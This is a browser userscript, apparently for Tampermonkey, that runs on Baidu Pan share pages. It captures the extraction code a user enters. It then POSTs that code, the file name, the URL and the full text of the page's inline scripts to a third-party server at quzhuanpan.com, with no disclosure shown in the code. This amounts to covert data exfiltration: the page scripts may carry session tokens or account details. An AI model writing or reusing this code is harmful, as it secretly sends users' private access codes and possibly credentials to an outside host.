var server_window_url = window.location.href;
var resourcePickup={};
resourcePickup.get_baidu_code = function(){
	var $a = document.getElementsByTagName("a");
	for(var i=0;i<$a.length;i++){
		var classs = $a[i].getAttribute("class");
		if(classs.indexOf("g-button")!=-1 && classs.indexOf("g-button-blue-large")){
			$a[i].addEventListener("click", function(){
				var $inputs = document.getElementsByTagName("input");
				var input_code = "****";
				for(var j=0;j<$inputs.length;j++){
					var tabindex = $inputs[j].getAttribute("tabindex");
					var type = $inputs[j].getAttribute("type");
					if((tabindex==1||tabindex=='1') && (type=='text'||type=='TEXT') ){
						input_code = $inputs[j].value;
						if(!input_code){
							input_code = "****";
						}
					}
				}
				GM_setValue("plugin_code",input_code);
				GM_setValue("plugin_pickup_time",new Date().getTime());
				GM_setValue("init_window_url",server_window_url);
			}, false);
		}
	}
};
resourcePickup.getElementsByClass = function(oParent, sClass){
	var aResult=[];
	try {
	 	var aEle=oParent.getElementsByTagName('*');
	    for(var i=0;i<aEle.length;i++){
	        if(aEle[i].className==sClass)
	        {
	            aResult.push(aEle[i]);
	        }
	    }
	} catch (e) {
		console.log("quzhuanpan tampermonkey scprit exception for getElementsByClass。。。"+e.message);
	}
    return aResult;
};
resourcePickup.get_baidu_share = function(){
	var plugin_code = GM_getValue("plugin_code");
	var plugin_pickup_time = GM_getValue("plugin_pickup_time");
	var init_window_url = GM_getValue("init_window_url");
	if(!init_window_url){init_window_url="";}
	var $layoutMain = document.getElementById("layoutMain");
	if(!$layoutMain){
		$layoutMain = document.getElementById("bd-main");
	}
	var classArrayObj = resourcePickup.getElementsByClass($layoutMain,"file-name");
	var fileName = "";
	for(var i=0;i<classArrayObj.length;i++){
		if(!fileName){
			fileName = classArrayObj[i].getAttribute("title");
		}else{
			break;
		}
	}
	var isOk = false;
	if(!!plugin_code){
		var nowTime = new Date().getTime();
		if(nowTime - Number(plugin_pickup_time) < 1000*3){
			isOk = true;
		}
	}else{isOk = true;plugin_code="";}
	GM_setValue("plugin_code","");
	GM_setValue("plugin_pickup_time","");
	GM_setValue("init_window_url","");
	if(isOk && !!fileName){
		var s = document.getElementsByTagName("script");
		var num = s.length;
		var script;
		var text;
		var allText = "";
		for(var i=0; i< num; i++){
			script = s[i];
			text = script.innerText;
			if(!!text){
				text = text.replace(/\t/g,"");
				text = text.replace(/\r/g,"");
				text = text.replace(/\n/g,"");
				text = text.replace(/\+/g,"%2B");//"+"
				text = text.replace(/\&/g,"%26");//"&" 
				text = text.replace(/\#/g,"%23");//"#"
				allText = allText + text;  //追加
			}
		}
		var url = window.location.href;
		var params = "fileName="+fileName+"&url="+url+"&code="+plugin_code+"&scripts="+allText+"&initUrl="+init_window_url+"";
		GM_xmlhttpRequest({
			url: "https://www.quzhuanpan.com/browser/js/analysis_tampermonkey",
		  	method: "POST",
		  	headers: {"Content-Type": "application/x-www-form-urlencoded"},
		  	data:params,
		  	onload: function(response) {
				var status = response.status;
				if(status==200||status=='200'){
					var serverResponseJson = JSON.parse(response.responseText);
				}
		  	}
		});
	}
};
	
function start_pan(){
	if(server_window_url.indexOf("pan.baidu.com/share/init") != -1){
		resourcePickup.get_baidu_code();
    }else if(server_window_url.indexOf("pan.baidu.com/s/") != -1){
    	resourcePickup.get_baidu_share();
    }
}